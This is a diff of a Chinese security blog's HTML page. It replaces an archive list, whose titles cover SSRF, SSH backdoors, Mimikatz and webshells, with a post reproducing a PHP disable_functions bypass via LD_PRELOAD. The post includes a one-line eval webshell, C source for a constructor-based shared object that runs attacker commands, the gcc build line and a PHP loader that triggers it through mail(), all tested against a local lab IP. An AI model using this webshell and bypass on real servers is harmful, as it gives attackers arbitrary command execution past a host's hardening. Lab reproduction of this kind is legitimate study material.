@@ -86,16 +86,17 @@
 
 
 
-<meta name="description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
-<meta property="og:type" content="website">
-<meta property="og:title" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:url" content="http://MaiKeFee.com/archives/2019/index.html">
+<meta name="description" content="前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好">
+<meta property="og:type" content="article">
+<meta property="og:title" content="「disablefunc绕过」一种绕过php disablefunc的方法复现">
+<meta property="og:url" content="http://MaiKeFee.com/archives/2ea7b633.html">
 <meta property="og:site_name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta property="og:description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
+<meta property="og:description" content="前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好">
 <meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-08-27T15:14:33.883Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
-<meta name="twitter:description" content="不断地绕过，不断地突破防御机制，考验的是一个安全研究者对于漏洞原理的理解，更是猥琐的思路。">
+<meta name="twitter:title" content="「disablefunc绕过」一种绕过php disablefunc的方法复现">
+<meta name="twitter:description" content="前言无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。 我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好">
 
 
 
@@ -125,13 +126,13 @@
 
 
 
-  <link rel="canonical" href="http://MaiKeFee.com/archives/2019/">
+  <link rel="canonical" href="http://MaiKeFee.com/archives/2ea7b633.html">
 
 
 
 
 
-  <title>归档 | MaiKeFee|一个兴趣使然的信息安全爱好者</title>
+  <title>「disablefunc绕过」一种绕过php disablefunc的方法复现 | MaiKeFee|一个兴趣使然的信息安全爱好者</title>
   
 
 
@@ -150,7 +151,7 @@
     
   
 
-  <div class="container sidebar-position-left page-archive">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -296,391 +297,246 @@
           <div id="content" class="content">
             
 
-  
-  
-  
-  <div class="post-block archive">
-    <div id="posts" class="posts-collapse">
-      <span class="archive-move-on"></span>
+  <div id="posts" class="posts-expand">
+    
 
-      <span class="archive-page-counter">
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://MaiKeFee.com/archives/2ea7b633.html">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="MaiKeFee">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/MaiKeFee_Logo.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="MaiKeFee|一个兴趣使然的信息安全爱好者">
+    </span>
+
+    
+      <header class="post-header">
+
         
         
+          <h1 class="post-title" itemprop="name headline">「disablefunc绕过」一种绕过php disablefunc的方法复现</h1>
         
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-08-27T23:14:27+08:00">
+                2019-08-27
+              </time>
+            
+
+            
+              <span class="post-meta-divider">|</span>
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-check-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">更新于&#58;</span>
+              
+              <time title="更新于" itemprop="dateModified" datetime="2019-08-27T23:14:33+08:00">
+                2019-08-27
+              </time>
+            
+          </span>
+
           
-        
-        嗯..! 目前共计 23 篇日志。 继续努力。
-      </span>
 
-      
-
-        
-        
-        
-
-        
           
-          <div class="collection-title">
-            <h1 class="archive-year" id="archive-year-2019">2019</h1>
-          </div>
-        
-        
+            
+          
 
-        
+          
+          
+             <span id="/archives/2ea7b633.html" class="leancloud_visitors" data-flag-title="「disablefunc绕过」一种绕过php disablefunc的方法复现">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+                 <span>℃</span>
+             </span>
+          
 
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv"></span>
+            </span>
+          
 
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/2ea7b633.html" itemprop="url">
+          
+            <div class="post-wordcount">
               
-                <span itemprop="name">「disablefunc绕过」一种绕过php disablefunc的方法复现</span>
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">字数统计&#58;</span>
+                
+                <span title="字数统计">
+                  1k
+                </span>
               
-            </a>
-        
-      </h2>
 
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:14:27+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
+              
+                <span class="post-meta-divider">|</span>
+              
 
-    </header>
-  </article>
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
+                
+                <span title="阅读时长">
+                  4
+                </span>
+              
+            </div>
+          
 
+          
 
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/c0cf419.html" itemprop="url">
-              
-                <span itemprop="name">SSRF中的绕过姿势</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:14:09+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
       
 
-        
-        
-        
+      
+        <p>前言<br>无意中刷到一个文章，关于disablefunction的方法绕过的，依然是脚本小子式的复现环境。</p>
+<p>我们也知道在渗透测试中经常会出现这种情况，写了shell，但是执行不了系统函数，这个时候不妨看看php的PHP info()，页面，通常就是函数被禁用，被禁用的话会很尴尬，因为自己种的马骑不了,所以这个时候就想办法绕过了。绕过的原理原理就是加上一个so文件啊，让执行系统函数的时候，默认执行我们做好的同名函数。</p>
+<p>环境搭建<br>ubuntu+apache2+php7.2<br>配置</p>
+<p>/etc/php/7.2/apache2/php.ini<br>设置</p>
+<pre><code>disable_functions = system,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstopped,pcntl_wifsignaled,pcntl_wifcontinued,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_get_handler,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,pcntl_sigprocmask,pcntl_sigwaitinfo,pcntl_sigtimedwait,pcntl_exec,pcntl_getpriority,pcntl_setpriority,pcntl_async_signals,</code></pre><p>然后重启apache2 服务器</p>
+<p>这样就能把system禁用了</p>
+<p>然后在网站的根目录上放一个shell.php</p>
+<pre><code>&lt;?php  @eval($_GET[&apos;fz41&apos;]);?&gt;</code></pre><p>访问shell.php</p>
+<p>可以正常执行php的代码，不能执行系统函数。</p>
+<p>测试访问</p>
+<pre><code>http://192.168.44.139/shell.php?fz41=phpinfo();</code></pre><p>可以看见phpinfo()的信息</p>
+<p>访问</p>
+<pre><code>http://192.168.44.139/shell.php?fz41=system(ls);</code></pre><p>没有任何回显</p>
+<p>环境配置成功，我们的任务就是通过劫持函数的方法来绕过这个disable_functions 的限制，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p>
+<p>原理解读<br>LD_PRELOAD的作用<br>LD_PRELOAD是Linux系统的一个环境变量，它可以影响程序的运行时的链接（Runtime<br>linker），它允许你定义在程序运行前优先加载的动态链接库。这个功能主要就是用来有选择性的载入不同动态链接库中的相同函数。通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。一方面，我们可以以此功能来使用自己的或是更好的函数（无需别人的源码），而另一方面，我们也可以以向别人的程序注入程序，从而达到特定的目的</p>
+<p>我们要做的就是通过修改环境变量LD_PRELOAD，让php启动新的进程的时候加载我们设置好的函数，比如说system()这样一来，就可以做到bypass了，只要启用了新的进程就有机会加载我们在上一个进程中构造的函数，通过测试可知mail可以创建新的进程，另外一个问题就是，如何构造我们想执行的函数，比如system()</p>
+<p>attribute((constructor))<br>GCC 有个 C 语言扩展修饰符 attribute__((constructor))，可以让由它修饰的函数在 main() 之前执行，若它出现在共享对象中时，那么一旦共享对象被系统加载，立即将执行 __attribute((constructor)) 修饰的函数。</p>
+<p>因此，可以通过这个方式来构造函数，把我们要执行的命令放在环境变量里，执行时直接加载环境变量的命令，就可以做到绕过了</p>
+<p>代码类似这种</p>
+<pre><code>#define _GNU_SOURCE
 
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/a90cd968.html" itemprop="url">
-              
-                <span itemprop="name">不知道列名的情况下注入</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:13:43+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;sys/types.h&gt;
+__attribute__ ((__constructor__)) void preloadme (void)
+{
+    unsetenv(&quot;LD_PRELOAD&quot;);
+    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);
+    system(cmdline);
+}</code></pre><p>工具使用<br><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a></p>
+<p>复现<br>gcc -shared -fPIC bypass_disablefunc.c -o bypass_disablefunc2.so<br>然后写利用如下php</p>
+<pre><code>&lt;?php
+    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc2.so  &lt;/p&gt;&quot;;
+    $cmd = $_GET[&quot;cmd&quot;];
+    $out_path = $_GET[&quot;outpath&quot;];
+    $evil_cmdline = $cmd . &quot; &gt; &quot; . $out_path . &quot; 2&gt;&amp;1&quot;;
+    echo &quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot; . $evil_cmdline . &quot;&lt;/p&gt;&quot;;
+    putenv(&quot;EVIL_CMDLINE=&quot; . $evil_cmdline);
+    $so_path = $_GET[&quot;sopath&quot;];
+    putenv(&quot;LD_PRELOAD=&quot; . $so_path);
+    mail(&quot;&quot;, &quot;&quot;, &quot;&quot;, &quot;&quot;);
+    echo &quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot; . nl2br(file_get_contents($out_path)) . &quot;&lt;/p&gt;&quot;; 
+    unlink($out_path);
+?&gt;</code></pre><p>然后访问</p>
+<p><a href="http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so" target="_blank" rel="noopener">http://192.168.44.139/bypass_disablefunc.php?cmd=whoami&amp;outpath=/tmp/xx&amp;sopath=/var/www/html/bypass_disablefunc2.so</a><br>参考链接<br><a href="https://www.freebuf.com/articles/web/192052.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/192052.html</a></p>
+<p><a href="https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD" target="_blank" rel="noopener">https://github.com/yangyangwithgnu/bypass_disablefunc_via_LD_PRELOAD</a><br>来源:<a href="https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/z98-KxxSeHVzHHssTLz-GQ</a></p>
 
       
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/21b719d6.html" itemprop="url">
-              
-                <span itemprop="name">渗透过程中的SSH(后门建立)</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:13:07+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/bd98337b.html" itemprop="url">
-              
-                <span itemprop="name">域渗透中找DC</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:12:25+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/ed9d09ca.html" itemprop="url">
-              
-                <span itemprop="name">使用Invoke-Mimikatz.ps1批量获取windows密码</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:11:58+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/54ea983c.html" itemprop="url">
-              
-                <span itemprop="name">「木马变形」一句话木马的各种变形</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:11:15+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/7eaedcae.html" itemprop="url">
-              
-                <span itemprop="name">Commands 搜集(持续更新)</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:10:48+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/df6dc829.html" itemprop="url">
-              
-                <span itemprop="name">「应急响应」应急响应实战笔记,一个安全工程师的自我修养</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:10:02+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
-        
-        
-        
-
-        
-        
-
-        
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      <h2 class="post-title">
-        
-            <a class="post-title-link" href="/archives/2db90a41.html" itemprop="url">
-              
-                <span itemprop="name">「前端钓鱼欺骗」前端黑魔法之远程控制地址栏</span>
-              
-            </a>
-        
-      </h2>
-
-      <div class="post-meta">
-        <time class="post-time" itemprop="dateCreated" datetime="2019-08-27T23:09:37+08:00" content="2019-08-27">
-          08-27
-        </time>
-      </div>
-
-    </header>
-  </article>
-
-
-
-      
-
     </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/archives/c0cf419.html" rel="next" title="SSRF中的绕过姿势">
+                <i class="fa fa-chevron-left"></i> SSRF中的绕过姿势
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
   </div>
   
   
   
-
-  
-  <nav class="pagination">
-    <span class="page-number current">1</span><a class="page-number" href="/archives/2019/page/2/">2</a><a class="page-number" href="/archives/2019/page/3/">3</a><a class="extend next" rel="next" href="/archives/2019/page/2/"><i class="fa fa-angle-right"></i></a>
-  </nav>
+  </article>
 
 
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
 
 
           </div>
@@ -688,6 +544,13 @@
 
 
           
+
+  
+    <div class="comments" id="comments">
+    </div>
+  
+
+
 
         </div>
         
@@ -934,6 +797,10 @@
 
 
   
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
 
   
 
